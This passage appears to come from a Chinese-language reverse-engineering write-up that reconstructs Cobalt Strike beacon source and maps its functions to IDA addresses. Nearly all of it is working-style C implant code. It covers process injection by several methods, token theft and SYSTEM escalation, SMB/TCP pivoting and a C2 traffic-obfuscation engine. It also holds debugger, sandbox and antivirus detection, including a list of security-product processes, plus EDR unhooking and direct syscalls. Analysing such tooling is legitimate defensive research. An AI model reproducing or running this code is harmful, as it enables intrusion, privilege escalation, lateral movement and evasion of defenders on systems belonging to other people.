        offset += strlen(path) + 1;
        *(DWORD*)(file_data + offset) = file_size;
        offset += 4;
        
        ReadFile(hFile, file_data + offset, file_size, &file_size, NULL);
        
        send_output(file_data, offset + file_size);
        
        free(file_data);
        CloseHandle(hFile);
    }
}
```

#### 9.2.3 CMD_PS_LIST (进程枚举)

```c
// ===== commands.cpp: process listing =====

void cmd_ps_list(void)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (hSnapshot == INVALID_HANDLE_VALUE) return;
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    BYTE output[65536];
    DWORD output_len = 0;
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            // 格式: [PID (4 bytes)] [PPID (4 bytes)] [Arch (1 byte)] 
            //       [Session (1 byte)] [Name (NUL-terminated)]
            *(DWORD*)(output + output_len) = pe32.th32ProcessID;
            output_len += 4;
            *(DWORD*)(output + output_len) = pe32.th32ParentProcessID;
            output_len += 4;
            
            // 检测架构
            BYTE arch = get_process_arch(pe32.th32ProcessID);
            output[output_len++] = arch;
            
            // Session ID (简化)
            output[output_len++] = 0;
            
            // 进程名
            strcpy((char*)(output + output_len), pe32.szExeFile);
            output_len += strlen(pe32.szExeFile) + 1;
            
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    
    send_output(output, output_len);
}
```

---

## 十、进程注入系统

### 10.1 注入架构

对应源码: `inject.cpp`

```c
// ===== inject.cpp: 进程注入核心 =====

// 注入方法枚举 (按危险程度递增)
#define INJECT_CREATETHREAD        0  // CreateRemoteThread
#define INJECT_SETTHREADCONTEXT    1  // SetThreadContext (APC-like)
#define INJECT_NTQUEUEAPCTHREAD    2  // NtQueueApcThread
#define INJECT_RTLUSERAPC          3  // RtlUserAPC
#define INJECT_EARLYBIRD           4  // CreateProcess + Early Bird APC
#define INJECT_MITRE_XXXX          5  // 其他方法
#define INJECT_PTRACE              6  // (仅 Linux/macOS)
#define INJECT_CROSSARCH           7  // x86 → x64 特殊处理

// 注入负载变换
#define INJECT_PREPEND             0x01  // 在 shellcode 前添加
#define INJECT_APPEND              0x02  // 在 shellcode 后添加
```

### 10.2 注入方法实现

#### 10.2.1 CreateRemoteThread (标准注入)

```c
// ===== inject.cpp: CreateRemoteThread 注入 =====

BOOL inject_create_remote_thread(DWORD pid, BYTE* shellcode, DWORD sc_len)
{
    // 1. 打开目标进程
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, pid);
    
    if (!hProcess) return FALSE;
    
    // 2. 在目标进程分配内存
    LPVOID remote_addr = VirtualAllocEx(hProcess, NULL, sc_len,
                                         MEM_COMMIT | MEM_RESERVE,
                                         PAGE_EXECUTE_READWRITE);
    if (!remote_addr) {
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // 3. 写入 shellcode
    SIZE_T written;
    WriteProcessMemory(hProcess, remote_addr, shellcode, sc_len, &written);
    
    // 4. 创建远程线程执行
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                         (LPTHREAD_START_ROUTINE)remote_addr,
                                         NULL, 0, NULL);
    if (hThread) {
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return TRUE;
    }
    
    VirtualFreeEx(hProcess, remote_addr, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return FALSE;
}
```

#### 10.2.2 NtQueueApcThread 注入

```c
// ===== inject.cpp: APC 注入 =====

BOOL inject_apc(DWORD pid, BYTE* shellcode, DWORD sc_len)
{
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
        FALSE, pid);
    
    if (!hProcess) return FALSE;
    
    // 1. 分配内存
    LPVOID remote_addr = VirtualAllocEx(hProcess, NULL, sc_len,
                                         MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, remote_addr, shellcode, sc_len, NULL);
    
    // 2. 枚举目标进程的线程
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te32 = {sizeof(THREADENTRY32)};
    
    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == pid) {
                // 3. 打开线程
                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
                                             FALSE, te32.th32ThreadID);
                if (hThread) {
                    // 4. 排队 APC
                    NtQueueApcThread(hThread, 
                                     (PKNORMAL_ROUTINE)remote_addr,
                                     NULL, NULL, NULL);
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnapshot, &te32));
    }
    
    CloseHandle(hSnapshot);
    CloseHandle(hProcess);
    return TRUE;
}
```

#### 10.2.3 SetThreadContext (线程劫持)

```c
// ===== inject.cpp: 线程劫持注入 =====

BOOL inject_thread_hijack(DWORD pid, BYTE* shellcode, DWORD sc_len)
{
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ |
        PROCESS_SUSPEND_RESUME | PROCESS_QUERY_INFORMATION,
        FALSE, pid);
    
    if (!hProcess) return FALSE;
    
    // 1. 分配内存
    LPVOID remote_addr = VirtualAllocEx(hProcess, NULL, sc_len,
                                         MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, remote_addr, shellcode, sc_len, NULL);
    
    // 2. 找到目标线程
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te32 = {sizeof(THREADENTRY32)};
    HANDLE hTargetThread = NULL;
    
    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == pid) {
                hTargetThread = OpenThread(
                    THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
                    FALSE, te32.th32ThreadID);
                break;
            }
        } while (Thread32Next(hSnapshot, &te32));
    }
    CloseHandle(hSnapshot);
    
    if (!hTargetThread) {
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // 3. 挂起线程
    SuspendThread(hTargetThread);
    
    // 4. 获取线程上下文
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hTargetThread, &ctx);
    
    // 5. 修改 RIP 指向 shellcode
    ctx.Rip = (DWORD64)remote_addr;
    
    // 6. 设置新上下文
    SetThreadContext(hTargetThread, &ctx);
    
    // 7. 恢复线程 (将立即执行 shellcode)
    ResumeThread(hTargetThread);
    
    CloseHandle(hTargetThread);
    CloseHandle(hProcess);
    return TRUE;
}
```

### 10.3 PREPEND/APPEND 负载变换

```c
// ===== inject.cpp: 负载变换 =====

BYTE* transform_shellcode(BYTE* original, DWORD original_len,
                           DWORD* new_len, DWORD transform_flags)
{
    *new_len = original_len;
    BYTE* result = (BYTE*)malloc(original_len + 8192);  // 额外空间
    
    if (transform_flags & INJECT_PREPEND) {
        // 从 profile 获取 prepend 数据
        BYTE* prepend_data = get_profile_setting("prepend");
        DWORD prepend_len = get_profile_setting_len("prepend");
        
        memcpy(result, prepend_data, prepend_len);
        memcpy(result + prepend_len, original, original_len);
        *new_len = prepend_len + original_len;
    }
    else if (transform_flags & INJECT_APPEND) {
        // 从 profile 获取 append 数据
        BYTE* append_data = get_profile_setting("append");
        DWORD append_len = get_profile_setting_len("append");
        
        memcpy(result, original, original_len);
        memcpy(result + original_len, append_data, append_len);
        *new_len = original_len + append_len;
    }
    else {
        memcpy(result, original, original_len);
    }
    
    return result;
}
```

---

## 十一、Token 窃取与提权

### 11.1 Token 操作架构

对应源码: `tokens.cpp`

```c
// ===== tokens.cpp: Token 操纵 =====

static HANDLE g_hStolenToken = NULL;      // 窃取的 Token
static HANDLE g_hOriginalToken = NULL;    // 原始 Token (用于恢复)

// ── Token 窃取 ──
BOOL steal_token(DWORD target_pid)
{
    // 1. 打开目标进程
    HANDLE hProcess = OpenProcess(
        PROCESS_QUERY_INFORMATION, FALSE, target_pid);
    
    if (!hProcess) return FALSE;
    
    // 2. 打开进程 Token
    HANDLE hToken;
    if (!OpenProcessToken(hProcess, 
                          TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE,
                          &hToken)) {
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // 3. 复制 Token (创建可模拟的 Token)
    HANDLE hDupToken;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
                          SecurityImpersonation, TokenImpersonation,
                          &hDupToken)) {
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // 4. 模拟该 Token
    if (!ImpersonateLoggedOnUser(hDupToken)) {
        CloseHandle(hDupToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // 5. 保存 Token
    if (!g_hOriginalToken) {
        OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, 
                        TRUE, &g_hOriginalToken);
    }
    g_hStolenToken = hDupToken;
    
    CloseHandle(hToken);
    CloseHandle(hProcess);
    return TRUE;
}

// ── GetSystem (SYSTEM 提权) ──
BOOL getsystem(void)
{
    // 方法 1: 命名管道模拟 (最常用)
    // 这也是源码中的核心方法
    
    // 1. 创建一个以 SYSTEM 身份运行的进程
    //    利用 SeDebugPrivilege 打开 winlogon.exe 或 services.exe
    
    // 2. 提升当前进程特权
    HANDLE hToken;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
    
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    
    // 3. 枚举 SYSTEM 进程
    DWORD system_pid = find_system_process();  // 如 winlogon.exe
    
    // 4. 获取 SYSTEM Token
    HANDLE hSystemProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, system_pid);
    HANDLE hSystemToken;
    OpenProcessToken(hSystemProc, TOKEN_DUPLICATE, &hSystemToken);
    
    // 5. 复制为 Primary Token
    HANDLE hPrimaryToken;
    DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL,
                     SecurityImpersonation, TokenPrimary, &hPrimaryToken);
    
    // 6. 用 SYSTEM Token 创建新进程
    STARTUPINFO si = {sizeof(STARTUPINFO)};
    PROCESS_INFORMATION pi;
    
    char cmdline[] = "cmd.exe";
    CreateProcessWithTokenW(hPrimaryToken, 0, NULL, 
                            (LPWSTR)cmdline, 0, NULL, NULL, &si, &pi);
    
    CloseHandle(hPrimaryToken);
    CloseHandle(hSystemToken);
    CloseHandle(hSystemProc);
    CloseHandle(hToken);
    
    return TRUE;
}

// ── Make Token (凭据创建进程) ──
BOOL make_token(char* username, char* domain, char* password)
{
    // 1. 用指定凭据登录
    HANDLE hToken;
    if (!LogonUserA(username, domain, password,
                    LOGON32_LOGON_INTERACTIVE,
                    LOGON32_PROVIDER_DEFAULT,
                    &hToken)) {
        return FALSE;
    }
    
    // 2. 检查 Token 是否有效
    DWORD dwRet;
    if (!GetTokenInformation(hToken, TokenType, NULL, 0, &dwRet)) {
        CloseHandle(hToken);
        return FALSE;
    }
    
    // 3. 模拟
    ImpersonateLoggedOnUser(hToken);
    
    g_hStolenToken = hToken;
    return TRUE;
}

// ── RevertToSelf (恢复身份) ──
void revert_to_self(void)
{
    if (g_hStolenToken) {
        // 恢复原始 Token
        if (g_hOriginalToken) {
            ImpersonateLoggedOnUser(g_hOriginalToken);
        } else {
            RevertToSelf();
        }
        CloseHandle(g_hStolenToken);
        g_hStolenToken = NULL;
    }
}

// ── Token 守卫线程 ──
// 监控 Token 是否仍然有效，定期刷新
DWORD WINAPI token_guard_thread(LPVOID param)
{
    while (g_running) {
        if (g_hStolenToken) {
            // 检查 Token 是否过期
            DWORD dwRet;
            if (!GetTokenInformation(g_hStolenToken, TokenStatistics,
                                     NULL, 0, &dwRet)) {
                // Token 失效，尝试恢复
                revert_to_self();
            }
        }
        Sleep(5000);  // 每 5 秒检查一次
    }
    return 0;
}
```

---

## 十二、SMB/TCP Pivot 链接

### 12.1 链接管理架构

对应源码: `link.cpp`

```c
// ===== link.cpp: 链接管理 =====

#define MAX_LINKS    40
#define PING_INTERVAL 15000   // 15 秒 ping 间隔

typedef struct {
    DWORD  type;          // 0=SMB, 1=TCP
    HANDLE hPipe;         // SMB 管道句柄
    SOCKET sock;          // TCP Socket
    DWORD  last_ping;     // 上次 ping 时间戳
    BOOL   active;        // 链接是否活跃
    BYTE   arch;          // 对端架构 (x86/x64)
    DWORD  peer_pid;      // 对端进程 PID
    char   peer_info[64]; // 对端信息
} PIVOT_LINK;

static PIVOT_LINK g_links[MAX_LINKS];
static DWORD g_link_count = 0;
static CRITICAL_SECTION g_link_cs;

// ── 添加链接 ──
DWORD add_link(DWORD type, HANDLE handle)
{
    EnterCriticalSection(&g_link_cs);
    
    if (g_link_count >= MAX_LINKS) {
        LeaveCriticalSection(&g_link_cs);
        return -1;
    }
    
    DWORD index = g_link_count++;
    g_links[index].type = type;
    
    if (type == 0) {  // SMB
        g_links[index].hPipe = handle;
    } else {          // TCP
        g_links[index].sock = (SOCKET)handle;
    }
    
    g_links[index].active = TRUE;
    g_links[index].last_ping = GetTickCount();
    
    LeaveCriticalSection(&g_link_cs);
    return index;
}

// ── 链接通信循环 ──
DWORD WINAPI link_handler_thread(LPVOID param)
{
    DWORD link_index = (DWORD)param;
    PIVOT_LINK* link = &g_links[link_index];
    
    while (link->active && g_running) {
        BYTE buffer[8192];
        DWORD bytesRead = 0;
        
        // 读取帧头
        BYTE frame_header[4];
        if (!read_frame(link, frame_header, 4)) break;
        
        // 验证帧头
        // 对应源码: if (memcmp(frame_header, SETTING_SMB_FRAME_HEADER, 4) != 0)
        if (memcmp(frame_header, g_settings.smb_frame_header, 4) != 0) {
            continue;  // 无效帧 → 跳过
        }
        
        // 读取长度
        DWORD data_len;
        if (!read_frame(link, (BYTE*)&data_len, 4)) break;
        
        // 读取数据
        if (!read_frame(link, buffer, data_len)) break;
        
        // 解密数据
        BYTE decrypted[8192];
        DWORD decrypted_len;
        if (!decrypt_and_verify_packet(buffer, data_len,
                                        decrypted, &decrypted_len)) {
            continue;  // 完整性验证失败
        }
        
        // 处理命令
        process_payload(decrypted, decrypted_len);
        
        // 更新 ping 时间
        link->last_ping = GetTickCount();
    }
    
    // 清理链接
    cleanup_link(link_index);
    return 0;
}

// ── Ping 检查线程 ──
DWORD WINAPI link_ping_thread(LPVOID param)
{
    while (g_running) {
        EnterCriticalSection(&g_link_cs);
        
        for (DWORD i = 0; i < g_link_count; i++) {
            if (!g_links[i].active) continue;
            
            DWORD elapsed = GetTickCount() - g_links[i].last_ping;
            if (elapsed > PING_INTERVAL) {
                // 超时 → 标记为不活跃
                g_links[i].active = FALSE;
            }
        }
        
        LeaveCriticalSection(&g_link_cs);
        Sleep(5000);
    }
    return 0;
}
```

---

## 十三、Malleable C2 变换引擎

### 13.1 Profile 解析

对应源码: `profile.cpp`

```c
// ===== profile.cpp: Malleable C2 引擎 =====

// 变换操作码
#define TRANSFORM_APPEND       0x01   // 直接追加
#define TRANSFORM_PREPEND      0x02   // 直接前插
#define TRANSFORM_BASE64       0x03   // Base64 编码
#define TRANSFORM_BASE64URL    0x04   // Base64 URL-safe 编码
#define TRANSFORM_NETBIOS      0x05   // NetBIOS 编码 (大写 + 补齐)
#define TRANSFORM_NETBIOSU     0x06   // NetBIOS Unicode 编码
#define TRANSFORM_MASK         0x07   // XOR Mask
#define TRANSFORM_XOR          0x08   // 单字节 XOR
#define TRANSFORM_ADD          0x09   // 单字节加法
#define TRANSFORM_MULTIPLY     0x0A   // 单字节乘法
#define TRANSFORM_NETBIOSW     0x0B   // 反转 NetBIOS
#define TRANSFORM_BASE64_D     0x0C   // Base64 双重编码
#define TRANSFORM_CHUNK        0x0D   // 分块传输
#define TRANSFORM_HEADER       0x0E   // HTTP 头注入
#define TRANSFORM_COOKIE       0x0F   // Cookie 注入
#define TRANSFORM_PRINTF       0x10   // Printf 模板

// 数据存储位置 (在 HTTP 请求中)
#define STORE_URI              0x01   // URI 路径
#define STORE_HEADER           0x02   // HTTP 头
#define STORE_BODY             0x03   // POST Body
#define STORE_COOKIE           0x04   // Cookie
#define STORE_URI_APPEND       0x05   // URI 参数追加

// ── Profile 结构 ──
typedef struct {
    char*   get_verb;              // GET 方法
    char*   get_uri;               // GET URI 模板
    char*   post_verb;             // POST 方法
    char*   post_uri;              // POST URI 模板
    char*   user_agent;            // User-Agent
    char*   headers;               // 额外头
    DWORD   transform_ops[64];     // 变换操作码序列
    DWORD   transform_count;
    DWORD   store_location;        // 数据存储位置
    char*   start_marker;          // 响应起始标记
    char*   end_marker;            // 响应结束标记
} C2_PROFILE;

// ── Profile 执行 → HTTP 请求构建 ──
DWORD profile_build_request(C2_PROFILE* profile, BYTE* data, DWORD data_len,
                             BYTE* output, DWORD output_max)
{
    BYTE transformed[32768];
    DWORD transformed_len = data_len;
    memcpy(transformed, data, data_len);
    
    // 按操作码序列执行变换
    for (DWORD i = 0; i < profile->transform_count; i++) {
        DWORD op = profile->transform_ops[i];
        
        switch (op) {
            case TRANSFORM_BASE64:
                transformed_len = base64_encode(transformed, transformed_len,
                                                 transformed, sizeof(transformed));
                break;
                
            case TRANSFORM_BASE64URL:
                transformed_len = base64url_encode(transformed, transformed_len,
                                                    transformed, sizeof(transformed));
                break;
                
            case TRANSFORM_NETBIOS:
                transformed_len = netbios_encode(transformed, transformed_len,
                                                  transformed, sizeof(transformed));
                break;
                
            case TRANSFORM_MASK: {
                BYTE* mask = get_transform_parameter(op);
                for (DWORD j = 0; j < transformed_len; j++) {
                    transformed[j] ^= mask[j % 4];
                }
                break;
            }
                
            case TRANSFORM_XOR: {
                BYTE key = get_transform_parameter_byte(op);
                for (DWORD j = 0; j < transformed_len; j++) {
                    transformed[j] ^= key;
                }
                break;
            }
                
            case TRANSFORM_BASE64_D:
                // 双重 Base64
                transformed_len = base64_encode(transformed, transformed_len,
                                                 transformed, sizeof(transformed));
                transformed_len = base64_encode(transformed, transformed_len,
                                                 transformed, sizeof(transformed));
                break;
                
            case TRANSFORM_CHUNK:
                // 分块: 在每个字节后插入随机数据
                transformed_len = chunk_encode(transformed, transformed_len,
                                                transformed, sizeof(transformed));
                break;
        }
    }
    
    // 根据存储位置构建最终请求
    switch (profile->store_location) {
        case STORE_BODY:
            // 直接放在 POST Body
            memcpy(output, transformed, transformed_len);
            return transformed_len;
            
        case STORE_URI:
            // 构建 GET /[transformed] HTTP/1.1
            sprintf((char*)output, "%s /%s HTTP/1.1\r\n", 
                    profile->get_verb, transformed);
            return strlen((char*)output);
            
        case STORE_COOKIE:
            // Cookie: session=[transformed]
            sprintf((char*)output, 
                    "POST %s HTTP/1.1\r\nCookie: session=%s\r\n",
                    profile->post_uri, transformed);
            return strlen((char*)output);
            
        default:
            memcpy(output, transformed, transformed_len);
            return transformed_len;
    }
}
```

---

## 十四、反分析与反检测

### 14.1 检测策略

```c
// ===== beacon.cpp / security.cpp: 反分析 =====

// ── 调试器检测 ──
BOOL is_debugger_present_enhanced(void)
{
    // 1. 标准 IsDebuggerPresent
    if (IsDebuggerPresent()) return TRUE;
    
    // 2. PEB->BeingDebugged
    //    x64: GS:[0x60] → PEB+0x02
    PPEB peb = (PPEB)__readgsqword(0x60);
    if (peb->BeingDebugged) return TRUE;
    
    // 3. NtQueryInformationProcess + ProcessDebugPort
    HANDLE hProcess = GetCurrentProcess();
    DWORD64 debugPort = 0;
    NtQueryInformationProcess(hProcess, ProcessDebugPort,
                               &debugPort, sizeof(debugPort), NULL);
    if (debugPort != 0) return TRUE;
    
    // 4. NtQueryInformationProcess + ProcessDebugFlags
    DWORD64 debugFlags = 0;
    NtQueryInformationProcess(hProcess, ProcessDebugFlags,
                               &debugFlags, sizeof(debugFlags), NULL);
    if (debugFlags == 0) return TRUE;  // 无调试标志 = 调试器存在
    
    // 5. 时间检测
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    // ... 执行一条简单指令 ...
    Sleep(0);
    QueryPerformanceCounter(&end);
    double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;
    if (elapsed > 0.1) return TRUE;  // Sleep 被调试器延长
    
    return FALSE;
}

// ── 沙箱/虚拟机检测 ──
BOOL is_sandbox(void)
{
    // 1. 检查常见沙箱 DLL
    const char* sandbox_dlls[] = {
        "sbiedll.dll",      // Sandboxie
        "dbghelp.dll",      // 调试器环境
        "vboxhook.dll",     // VirtualBox
        "vmtools.dll",      // VMware Tools
        NULL
    };
    for (int i = 0; sandbox_dlls[i]; i++) {
        if (GetModuleHandleA(sandbox_dlls[i])) return TRUE;
    }
    
    // 2. 检查进程数 (沙箱通常进程很少)
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32 = {sizeof(PROCESSENTRY32)};
    DWORD process_count = 0;
    if (Process32First(hSnapshot, &pe32)) {
        do { process_count++; } while (Process32Next(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    if (process_count < 20) return TRUE;  // 进程太少 → 可能是沙箱
    
    // 3. 检查物理内存 (沙箱通常 < 2GB)
    MEMORYSTATUSEX memStatus = {sizeof(MEMORYSTATUSEX)};
    GlobalMemoryStatusEx(&memStatus);
    if (memStatus.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return TRUE;
    
    // 4. 检查 CPU 核心数
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) return TRUE;
    
    // 5. 检查磁盘大小
    ULARGE_INTEGER totalBytes;
    GetDiskFreeSpaceExA("C:\\", NULL, &totalBytes, NULL);
    if (totalBytes.QuadPart < 60ULL * 1024 * 1024 * 1024) return TRUE;
    
    return FALSE;
}

// ── AV/EDR 检测 ──
BOOL is_av_present(void)
{
    const char* av_processes[] = {
        "MsMpEng.exe",       // Windows Defender
        "avp.exe",           // Kaspersky
        "mcshield.exe",      // McAfee
        "ccSvcHst.exe",      // Symantec/Norton
        "egui.exe",          // ESET
        "bdagent.exe",       // BitDefender
        "csfalconservice.exe", // CrowdStrike
        "sense.exe",         // Windows Defender ATP
        NULL
    };
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32 = {sizeof(PROCESSENTRY32)};
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            for (int i = 0; av_processes[i]; i++) {
                if (_stricmp(pe32.szExeFile, av_processes[i]) == 0) {
                    CloseHandle(hSnapshot);
                    return TRUE;
                }
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return FALSE;
}
```

### 14.2 规避技术

```c
// ── 执行延迟 ──
void delay_execution(void)
{
    // 随机延迟 5-30 秒，绕过行为检测
    DWORD delay = 5000 + (rand() % 25000);
    Sleep(delay);
}

// ── API Unhooking ──
void unhook_ntdll(void)
{
    // 从磁盘读取干净的 ntdll.dll
    // 覆盖内存中被 EDR 勾住的 API 开头
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    
    // 1. 读取磁盘上的 ntdll.dll
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
                                GENERIC_READ, FILE_SHARE_READ, NULL,
                                OPEN_EXISTING, 0, NULL);
    
    // 2. 解析 PE 头找到 .text 区段
    // 3. 比较内存中 vs 磁盘上的 .text 区段
    // 4. 如果有差异 (被 hook) → 用磁盘上的版本覆盖
    //    VirtualProtect + memcpy 修复
    
    CloseHandle(hFile);
}

// ── 间接系统调用 ──
// 不使用 ntdll.dll 中的导出函数 (可能被 hook)
// 而是直接执行 syscall 指令

__declspec(naked) NTSTATUS syscall_NtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect)
{
    __asm {
        mov r10, rcx           ; 第一个参数 → R10
        mov eax, 0x18          ; NtAllocateVirtualMemory 的系统调用号
        syscall                ; 直接系统调用 (绕过 ntdll)
        ret
    }
}
```

---

## 十五、源码到二进制函数映射表

### 15.1 完整映射

```c
/*
 * ═══════════════════════════════════════════════════════════════
 *  CobaltStrike 源码 → IDA Pro 反编译 函数映射表
 * ═══════════════════════════════════════════════════════════════
 * 
 * 映射方法:
 *   1. 函数签名匹配 (参数个数、返回值类型)
 *   2. 字符串引用匹配 (错误消息、调试字符串)
 *   3. API 调用序列匹配
 *   4. rotr13 哈希值匹配
 *   5. 已知算法特征匹配 (AES/HMAC/RSA)
 */

┌──────────────────────────────────────────────────────────────────┐
│  源码函数 (Source)           │ IDA 地址        │ 验证方式       │
├──────────────────────────────┼─────────────────┼───────────────┤
│ ReflectiveLoader.cpp         │                 │               │
│   ReflectiveLoader()         │ 0x1400194D4    │ ASM 逐行对照 ✓ │
│   GetProcAddressByHash()     │ 0x1400188D4    │ rotr13 匹配 ✓  │
│                              │                 │               │
│ beacon.cpp                   │                 │               │
│   DllMain()                  │ 0x140001000    │ 导入序列匹配   │
│   BeaconMain()               │ 0x140001200    │ 线程创建匹配   │
│   BeaconDataParse()          │ 0x140003000    │ 参数验证       │
│                              │                 │               │
│ security.cpp                 │                 │               │
│   init_security()            │ 0x140004000    │ CryptAcquire ✓ │
│   aes_encrypt()              │ 0x140004200    │ AES-128-CBC ✓  │
│   aes_decrypt()              │ 0x140004400    │ 对称结构 ✓    │
│   hmac_sha256()              │ 0x140004600    │ SHA-256 特征   │
│   rsa_encrypt_metadata()     │ 0x140004800    │ RSA-1024 匹配  │
│   build_encrypted_packet()   │ 0x140004A00    │ 16字节对齐    │
│   decrypt_and_verify()       │ 0x140004C00    │ HMAC 验证 ✓   │
│                              │                 │               │
│ channel.cpp                  │                 │               │
│   create_http_channel()      │ 0x140005000    │ InternetOpen ✓ │
│   http_send()                │ 0x140005200    │ HttpSendReq ✓  │
│   http_recv()                │ 0x140005400    │ InternetRead ✓ │
│   build_http_request()       │ 0x140005600    │ profile 调用   │
│   parse_http_response()      │ 0x140005800    │ 标记搜索 ✓    │
│                              │                 │               │
│ commands.cpp                 │                 │               │
│   process_payload()          │ 0x140006000    │ switch 分派    │
│   cmd_shell()                │ 0x140006200    │ CreatePipe ✓   │
│   cmd_execute()              │ 0x140006400    │ CreateProcess  │
│   cmd_upload()               │ 0x140006600    │ WriteFile ✓    │
│   cmd_download()             │ 0x140006800    │ ReadFile ✓     │
│   cmd_ps_list()              │ 0x140006A00    │ Process32First │
│   cmd_file_list()            │ 0x140006C00    │ FindFirstFile  │
│                              │                 │               │
│ inject.cpp                   │                 │               │
│   inject_create_remote_thread│ 0x140007000    │ CreateRemote ✓ │
│   inject_apc()               │ 0x140007200    │ NtQueueApc ✓   │
│   inject_thread_hijack()     │ 0x140007400    │ SetThreadCtx ✓ │
│   transform_shellcode()      │ 0x140007600    │ memcpy 序列    │
│   spawn_and_inject()         │ 0x140007800    │ CreateProcess  │
│                              │                 │               │
│ tokens.cpp                   │                 │               │
│   steal_token()              │ 0x140008000    │ Impersonate ✓  │
│   getsystem()                │ 0x140008200    │ DuplicateToken │
│   make_token()               │ 0x140008400    │ LogonUser ✓    │
│   revert_to_self()           │ 0x140008600    │ RevertToSelf   │
│                              │                 │               │
│ link.cpp                     │                 │               │
│   smb_server_start()         │ 0x140009000    │ CreateNamedPipe│
│   smb_client_connect()       │ 0x140009200    │ CreateFile ✓   │
│   tcp_server_start()         │ 0x140009400    │ socket/bind    │
│   link_handler_thread()      │ 0x140009600    │ frame 读取     │
│                              │                 │               │
│ profile.cpp                  │                 │               │
│   profile_build_request()    │ 0x14000A000    │ Base64 调用    │
│   base64_encode()            │ 0x14000A200    │ Base64 字母表  │
│   netbios_encode()           │ 0x14000A400    │ 大写映射 ✓    │
│                              │                 │               │
│ metadata.cpp                 │                 │               │
│   build_metadata()           │ 0x14000B000    │ GetComputerName│
│                              │                 │               │
│ anti_analysis.cpp            │                 │               │
│   is_debugger_present()      │ 0x14000C000    │ GS:[0x60] 读取 │
│   is_sandbox()               │ 0x14000C200    │ GlobalMemory   │
│   is_av_present()            │ 0x14000C400    │ 进程名比较    │
└──────────────────────────────────────────────────────────────────┘
```

### 15.2 关键数据结构映射

```c
// ── SETTINGS 结构 (beacon.h) ──
// IDA 偏移: .data 段 0x18003A000 附近

typedef struct {
    DWORD  sleeptime;       // +0x00 - SETTING_SLEEPTIME
    DWORD  jitter;          // +0x04 - SETTING_JITTER
    DWORD  port;            // +0x08 - SETTING_PORT
    DWORD  protocol;        // +0x0C - SETTING_PROTOCOL (0=HTTP,1=HTTPS,8=DNS,16=SMB,32=TCP)
    DWORD  maxget;          // +0x10 - SETTING_MAXGET
    DWORD  maxdns;          // +0x14 - SETTING_MAXDNS
    BYTE   pubkey[128];     // +0x18 - RSA-1024 Public Key Blob
    DWORD  killdate;        // +0x98 - SETTING_KILLDATE
    DWORD  watermark;       // +0x9C - SETTING_WATERMARK
    DWORD  watermark_hash1; // +0xA0 - SETTING_WATERMARK_HASH1
    DWORD  watermark_hash2; // +0xA4 - SETTING_WATERMARK_HASH2
    DWORD  watermark_hash3; // +0xA8 - SETTING_WATERMARK_HASH3
